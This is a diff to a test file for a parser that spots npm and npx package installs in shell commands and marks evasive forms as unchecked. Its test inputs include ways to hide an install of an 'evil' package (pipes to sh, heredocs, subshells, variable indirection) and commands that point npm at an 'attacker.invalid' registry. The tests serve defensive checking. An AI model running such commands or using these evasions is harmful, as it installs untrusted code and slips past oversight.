@@ -17,7 +17,7 @@ describe("installIntents", () => {
     ["npm install", "install /repo []"],
     ["npm install --omit dev", "install /repo []"],
     ["npm ci", "ci /repo"],
-    ["npm update", "install /repo []"],
+    ["npm update", "update /repo []"],
     ["npx cowsay hi", "run /repo [cowsay]"],
     ["npx --yes create-vite@latest app", "run /repo [create-vite@latest]"],
     ["npx -p typescript tsc --version", "run /repo [typescript]"],
@@ -92,5 +92,83 @@ describe("installIntents", () => {
         reason: expect.stringContaining(reason),
       }),
     ]);
+  });
+
+  it.each([
+    ["if true; then npm install evil; fi"],
+    ["for p in a b; do npm i evil; done"],
+    ["f() { npm install evil; }; f"],
+    ["! npm i evil"],
+    ["timeout 300 npm install evil"],
+    ["sudo -u root npm i evil"],
+    ["nice -n 10 npm i evil"],
+    ["x=$(npm i evil)"],
+    ["echo `npm i evil`"],
+    ["npm -p install evil"],
+    ["npm install -p evil"],
+    ["npm upd"],
+    ["npm installTest"],
+    ["npm cre vite"],
+  ])("sees the install in %s (M4 review)", (command) => {
+    expect(at(command).length).toBeGreaterThan(0);
+    expect(at(command).every((i) => i.kind !== "unchecked")).toBe(true);
+  });
+
+  it.each([
+    ["bash -lc 'npm install evil'", "install /repo [evil]"],
+    ["bash -e -c 'npm i evil'", "install /repo [evil]"],
+    ["npm -C /tmp/x install evil", "install /tmp/x [evil]"],
+    ["npx evil --package lodash", "run /repo [evil]"],
+    ["npm install -p evil", "install /repo [evil]"],
+  ])("reads %s the way npm does", (command, expected) => {
+    expect(kinds(command)).toEqual([expected]);
+  });
+
+  it("treats -L global as a global install", () => {
+    expect(at("npm -L global install evil")[0]).toMatchObject({
+      kind: "install",
+      global: true,
+    });
+  });
+
+  it.each([
+    ["echo 'npm install evil' | sh", "stdin"],
+    ["sh <<EOF\nnpm install evil\nEOF", "heredoc"],
+    ["n=npm; $n install evil", "only known when the shell runs"],
+    ["ls | xargs npm install", "through xargs"],
+    ["find . -name x -exec npm i {} \\;", "through find"],
+    ["corepack npm install evil", "corepack"],
+    ["env -S 'npm install evil'", "env changes"],
+    ["npm --proxy-ish x install evil", "takes a value"],
+    ["npm audit fix", "audit fix"],
+    ["npm dedupe", "dedupe"],
+    [
+      "npm i @evil/pkg --@evil:registry=https://attacker.invalid/",
+      "registry or config",
+    ],
+    [
+      "npm config set registry https://attacker.invalid/ && npm i evil",
+      "registry settings",
+    ],
+    [
+      "echo registry=https://attacker.invalid/ > .npmrc && npm i evil",
+      "registry settings",
+    ],
+  ])("fails closed on %s (M4 review)", (command, reason) => {
+    expect(at(command)).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          kind: "unchecked",
+          reason: expect.stringContaining(reason),
+        }),
+      ]),
+    );
+  });
+
+  it("leaves heredoc bodies and script files alone", () => {
+    expect(at("cat > README.md <<'EOF'\nRun npm install first.\nEOF")).toEqual(
+      [],
+    );
+    expect(at("bash scripts/build.sh && npm test")).toEqual([]);
   });
 });
